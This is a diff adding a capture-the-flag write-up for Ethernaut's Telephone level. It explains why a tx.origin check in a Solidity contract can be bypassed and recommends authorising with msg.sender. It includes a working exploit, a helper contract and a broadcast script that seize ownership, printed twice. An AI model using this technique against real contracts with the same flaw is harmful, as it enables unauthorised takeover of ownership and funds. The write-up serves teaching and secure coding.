@@ -1,0 +1,179 @@
+# Ethernaut Level 4 – Telephone
+
+## Overview
+
+The objective of this challenge is to claim ownership of the Telephone 
+contract by calling changeOwner() with the player address.
+
+At first glance, the function appears protected by checking whether 
+tx.origin differs from msg.sender. However, this check can be trivially 
+bypassed by routing the call through an intermediate contract.
+
+---
+
+# Vulnerable Contract
+
+```solidity
+function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+        owner = _owner;
+    }
+}
+```
+
+---
+
+# Root Cause
+
+The contract relies on:
+
+```solidity
+tx.origin != msg.sender
+```
+
+as its authorization check.
+
+This is **not a secure access control pattern**.
+
+- `tx.origin` always returns the original EOA that initiated 
+  the transaction chain — no matter how many contracts are 
+  called in between
+- `msg.sender` returns the immediate caller — which changes 
+  at every call boundary
+
+If the call goes through an intermediate contract:
+- `tx.origin` = player wallet
+- `msg.sender` = intermediate contract
+- They differ → condition passes → ownership transferred
+
+---
+
+# Understanding the Check
+
+Direct call from wallet:
+tx.origin = wallet
+msg.sender = wallet
+tx.origin != msg.sender → FALSE → ownership NOT transferred
+
+Call through intermediate contract:
+tx.origin = wallet
+msg.sender = intermediate contract
+tx.origin != msg.sender → TRUE → ownership transferred
+
+
+The check intended to protect ownership actually grants it 
+to anyone who routes their call through any contract.
+
+---
+
+# Exploit
+
+Deploy a helper contract that calls changeOwner() on behalf 
+of the player. Since the call originates from the player wallet 
+but passes through the helper contract, the condition is satisfied.
+
+```solidity
+contract HelperContract {
+    function attack(Telephone _target, address _player) external {
+        _target.changeOwner(_player);
+    }
+}
+
+function run() external {
+    vm.startBroadcast(PLAYER_PRIVATE_KEY);
+
+    HelperContract helper = new HelperContract();
+    helper.attack(telephoneInstance, PLAYER_ADDRESS);
+
+    vm.stopBroadcast();
+}
+```
+
+---
+
+# Call Chain
+
+PLAYER_WALLET (tx.origin)
+↓ calls
+HelperContract.attack() ← msg.sender inside changeOwner
+↓ calls
+Telephone.changeOwner()
+tx.origin = PLAYER_WALLET
+msg.sender = HelperContract
+tx.origin != msg.sender ✓
+owner = PLAYER_ADDRESS ✓
+
+
+---
+
+# Security Impact
+
+Using tx.origin for authorization is dangerous because:
+
+- Any intermediate contract breaks the tx.origin == msg.sender 
+  assumption trivially
+- A malicious contract can trick a user into calling it, then 
+  use tx.origin to pass auth checks in a victim contract
+- This is the exact mechanism behind tx.origin phishing attacks
+
+This pattern can completely break:
+- Ownership controls
+- Admin functions
+- Withdrawal authorization
+- Privileged protocol operations
+
+---
+
+# Recommended Mitigation
+
+Never use tx.origin for authorization. Always use msg.sender.
+
+```solidity
+// Vulnerable
+function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+        owner = _owner;
+    }
+}
+
+// Secure
+function changeOwner(address _owner) public {
+    require(msg.sender == owner, "not owner");
+    owner = _owner;
+}
+```
+
+---
+
+# Key Takeaways
+
+- tx.origin always returns the original EOA regardless of call depth
+- msg.sender changes at every contract boundary
+- tx.origin != msg.sender is satisfied by any intermediate contract
+- Never use tx.origin for access control
+- Always authenticate with msg.sender
+
+---
+
+# Exploit Summary
+
+```solidity
+contract HelperContract {
+    function attack(Telephone _target, address _player) external {
+        _target.changeOwner(_player);
+    }
+}
+
+function run() external {
+    vm.startBroadcast(PLAYER_PRIVATE_KEY);
+
+    HelperContract helper = new HelperContract();
+    helper.attack(telephoneInstance, PLAYER_ADDRESS);
+
+    vm.stopBroadcast();
+}
+```
+
+Route the call through HelperContract so that tx.origin 
+(player wallet) differs from msg.sender (helper contract), 
+satisfying the condition and transferring ownership.
